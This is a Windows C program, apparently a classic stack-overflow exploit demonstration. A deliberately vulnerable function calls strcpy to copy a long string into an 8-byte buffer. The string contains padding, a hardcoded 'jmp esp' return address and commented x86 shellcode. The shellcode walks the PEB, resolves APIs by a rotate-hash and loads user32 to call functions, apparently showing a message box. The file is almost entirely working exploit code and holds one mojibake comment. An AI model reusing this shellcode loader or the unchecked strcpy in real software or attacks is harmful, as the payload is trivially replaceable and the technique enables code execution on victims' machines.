#include <windows.h>
char src[] =
"\x41\x41\x41\x41"
"\x41\x41\x41\x41"
"\x41\x41\x41\x41"
"\x12\x45\xFA\x7F"				//jmp espÌø°å

//main:
"\x66\x81\xEC\x04\x01"		//sub sp,0x0104
"\x8B\xEC"                	//mov         ebp,esp
"\x33\xC0"                	//xor         eax,eax
"\x66\xB8\x33\x32"          	//mov         ax,offset main+6 (0040d47e)
"\x50"                   		//push        eax
"\x68\x75\x73\x65\x72"      //push        72657375h
"\x66\xB8\x6D\x6D"         	//mov       ax,offset main+10h (0040d488)
"\x50"                   		//push        eax
"\x99"                   		//cdq
"\x64\x8B\x5A\x30"          	//mov         ebx,dword ptr fs:[edx+30h]
"\x8B\x4B\x0C"             	//mov         ecx,dword ptr [ebx+0Ch]
"\x8B\x49\x1C"             	//mov         ecx,dword ptr [ecx+1Ch]
"\x8B\x09"                	//mov         ecx,dword ptr [ecx]
"\x8B\x49\x08"             	//mov         ecx,dword ptr [ecx+8]
"\x51"                   		//push        ecx
"\x68\x32\x74\x91\x0C"    	//push        0C917432h
"\x51"                   		//push        ecx
"\xB3\x01"                	//mov         bl,1
"\xEB\x39"                	//jmp         FindFunc 

//MainTemp:
"\x80\xFB\x01"             	//cmp         bl,1
"\x74\x0A"                	//je          MainTemp1 
"\x80\xFB\x02"             	//cmp         bl,2
"\x74\x15"                	//je          MainTemp2 
"\x80\xFB\x03"             	//cmp         bl,3
"\x74\x26"                	//je          MainTemp3 

//MainTemp1:
"\x8D\x4D\xF8"             	//lea         ecx,[ebp-8]
"\x51"                   		//push        ecx
"\xFF\xD0"                	//call        eax
"\x68\x6A\x0A\x38\x1E"     	//push        1E380A6Ah
"\x50"                   		//push        eax
"\xB3\x02"                	//mov         bl,2
"\xEB\x1A"                	//jmp         FindFunc 

//MainTemp2:
"\x99"                   		//cdq
"\x52"                   		//push        edx
"\x8D\x4D\xF4"             	//lea         ecx,[ebp-0Ch]
"\x51"                   		//push        ecx
"\x51"                   		//push        ecx
"\x52"                   		//push        edx
"\xFF\xD0"                	//call        eax
"\x68\x63\x89\xD1\x4F"    	//push        4FD18963h
"\xFF\x75\xF0"            	//push        dword ptr [ebp-10h]
"\xB3\x03"                	//mov         bl,3
"\xEB\x04"                	//jmp         FindFunc 

//MainTemp3:
"\x99"                   		//cdq
"\x52"                   		//push        edx
"\xFF\xD0"                	//call        eax


//FindFunc:
"\x55"                   		//push        ebp
"\x8B\xEC"                	//mov         ebp,esp
"\x53"                   		//push        ebx
"\x8B\x5D\x04"             	//mov         ebx,dword ptr [ebp+4]
"\x8B\x43\x3C"             	//mov         eax,dword ptr [ebx+3Ch]
"\x8B\x4C\x18\x78"          	//mov         ecx,dword ptr [eax+ebx+78h]
"\x03\xCB"                	//add         ecx,ebx
"\x8B\x51\x20"             	//mov         edx,dword ptr [ecx+20h]
"\x03\xD3"                	//add         edx,ebx
"\x33\xFF"                	//xor         edi,edi

//FindFuncLoop:
"\x47"                   		//inc         edi
"\x8B\x34\xBA"             	//mov         esi,dword ptr [edx+edi*4]
"\x03\xF3"                	//add         esi,ebx
"\x56"                   		//push        esi
"\xEB\x1B"                	//jmp         GetHash (0040d51a)

//FindFuncTemp:
"\x3B\x45\x08"             	//cmp         eax,dword ptr [ebp+8]
"\x75\xF2"                	//jne         FindFuncLoop (0040d4f6)
"\x8B\x41\x1C"             	//mov         eax,dword ptr [ecx+1Ch]
"\x03\xC3"                	//add         eax,ebx
"\x8B\x04\xB8"             	//mov         eax,dword ptr [eax+edi*4]
"\x03\xC3"                	//add         eax,ebx
"\xEB\x01"                	//jmp         FindFuncRetrun (0040d511)
"\x90"                   		//nop
//FindFuncRetrun:
"\x5B"                   		//pop         ebx
"\x8B\xE5"                	//mov         esp,ebp
"\x5D"                   		//pop         ebp
"\x83\xC4\x08"             	//add         esp,8
"\xEB\x8C"                	//jmp         MainTemp 


//GetHash:
"\x55"                   		//push        ebp
"\x8B\xEC"                	//mov         ebp,esp
"\x53"                   		//push        ebx
"\x51"                   		//push        ecx
"\x52"                   		//push        edx
"\x33\xC0"                	//xor         eax,eax
"\x33\xDB"                	//xor         ebx,ebx
"\x99"                   		//cdq
"\x8B\x4D\x04"             	//mov         ecx,dword ptr [ebp+4]

//HashLoop:
"\x3A\x11"                	//cmp         dl,byte ptr [ecx]
"\x74\x0C"                	//je          GetHashReturn 
"\xC1\xC8\x07"             	//ror         eax,7
"\x0F\xBE\x19"             	//movsx       ebx,byte ptr [ecx]
"\x03\xC3"                	//add         eax,ebx
"\x41"                   		//inc         ecx
"\xEB\xF1"                	//jmp         HashLoop 
"\x90"                   		//nop

//GetHashReturn:
"\x5A"                   		//pop         edx
"\x59"                   		//pop         ecx
"\x5B"                   		//pop         ebx
"\x8B\xE5"                	//mov         esp,ebp
"\x5D"                   		//pop         ebp
"\x83\xC4\x04"             	//add         esp,4
"\xEB\xBC";                	//jmp         FindFuncTemp

int MyFunc()
{
	CHAR dest[8] = {0};
	strcpy(dest,src);
}
int main()
{
	char buff[256] = {0};
	MyFunc();
	return 0;
}
